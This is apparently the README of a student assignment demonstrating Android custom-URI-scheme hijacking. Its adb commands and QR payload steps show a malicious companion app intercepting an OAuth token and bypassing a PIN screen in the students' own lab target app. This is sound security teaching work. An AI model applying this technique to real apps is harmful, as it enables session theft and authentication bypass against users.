# SMD_2025-2026_Assignment-3_QR-Code-Deep-Link-Hijacking-in-Android
Students:
- Borsos Matheas-Roland (SAS1)
- Comarlau Vlad-Constantin (SAS1)


# Offensive PoC

Demonstrates that a malicious Android app registering the same custom URI
scheme as a target app can intercept its OAuth callback token and forge
intents into its exported components, bypassing the local-auth gate. QR
codes carrying `smdpoc://` URIs serve as the delivery vector.

## Prerequisites

- Android Studio + `adb` on `$PATH`
- An AVD (API ≥ 26) running
- Python 3.9+

## Setup

Install both apps on the same AVD:

1. Open `target-app/` in Android Studio → ▶️ Run.
2. Open `attacker-app/` in a new window → ▶️ Run.

Verify:

```bash
adb shell pm list packages | grep ro.upb.smd.poc
```

Install the QR generator:

```bash
cd payload-gen
python3 -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt
python3 payload_gen.py     # writes out/qr_oauth.png and out/qr_internal.png
```

## Attack 1 — OAuth token interception

```bash
adb shell am start -W -a android.intent.action.VIEW \
  -d 'smdpoc://oauth/callback?token=REAL_USER_SESSION_42'
```

Pick **MaliciousCompanion** in the chooser → its UI shows
`STOLEN TOKEN: REAL_USER_SESSION_42`.

## Attack 2 — Intent injection (PIN bypass)

```bash
adb shell am start -W -a android.intent.action.VIEW \
  -d 'smdpoc://internal/launch?cmd=show_secret'
```

Pick **MaliciousCompanion** → emulator jumps straight to
**Internal — sensitive settings**, skipping the PIN screen.

## Evidence

Tail logs while running the attacks:

```bash
adb logcat -s 'ATTACKER:*' 'TARGET:*'
```
